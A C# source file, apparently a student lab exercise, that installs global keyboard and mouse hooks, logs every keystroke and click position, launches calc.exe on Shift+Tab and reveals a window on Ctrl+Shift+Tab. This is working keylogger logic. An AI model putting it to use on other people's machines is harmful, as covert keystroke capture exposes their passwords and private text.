using Gma.System.MouseKeyHook;
using System.Windows.Forms;
using System.Diagnostics;

namespace Laba_8
{
    public class GlobalHooks
    {
        public delegate void WindowShowHandler();

        private readonly IKeyboardMouseEvents _globalHooks = Hook.GlobalEvents();
        private readonly Logger _logger;
        private readonly Settings _settings;
        private readonly WindowShowHandler _windowShow;

        public GlobalHooks(Settings config, WindowShowHandler windowShow)
        {
            _settings = config;
            _windowShow = windowShow;
            _logger = new Logger(_settings);
            _globalHooks.KeyDown += KeyEvent;
            _globalHooks.MouseClick += MouseEvent;
        }

        private void KeyEvent(object sender, KeyEventArgs e)
        {
            if (_settings.IsHooks)
            {
                if (e.KeyData == (Keys.Shift | Keys.Tab))
                {
                    Process.Start("calc.exe");
                }
                _logger.KeyLogger(e.KeyData.ToString());
            }
            if (e.KeyData == (Keys.Control | Keys.Shift | Keys.Tab))
            {
                if (_windowShow != null)
                {
                    _windowShow.Invoke();
                }
            }
        }

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (_settings.IsHooks)
            {
                _logger.MouseLogger(e.Button.ToString(), e.Location.ToString());
            }
        }
    }
}